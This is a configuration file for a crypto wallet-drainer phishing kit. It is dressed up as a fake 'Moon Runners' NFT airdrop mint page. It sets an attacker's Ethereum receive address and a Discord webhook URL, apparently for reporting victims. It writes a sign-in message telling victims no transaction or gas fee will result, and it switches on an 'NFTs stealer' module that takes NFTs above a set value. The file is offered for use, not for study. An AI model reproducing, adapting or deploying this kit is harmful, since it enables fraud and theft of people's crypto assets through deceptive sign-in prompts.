const receiveAddress = "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c";
webhookURL  = "https://discord.com/api/webhooks/985877157169463306/5OA21yO6KY9nj0L1UdM2lMWvzpnAUHfvMzdVmkZbfZ24pCQrh6mvxwH9lx1EICI00_9u"

const collectionInfo = {
    name: "Moon Runners",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/MoonRunners",
        instagram: "",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "AIRDROP",
}

const claimPageInfo = {
    title: "Airdrop<br>NFT", // <br> is a line break
    shortDescription: "SHOW YOUR LOYALTY.",
    longDescription: "A Moon Runners TOKEN IS A SIGN YOU’VE BEEN PART OF THE ADVENTURE SINCE THE START. IT GIVES YOU EARLY ACCESS TO MERCH, EVENTS AND MORE.",

    claimButtonText: "MINT NOW",

    image: "logo.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
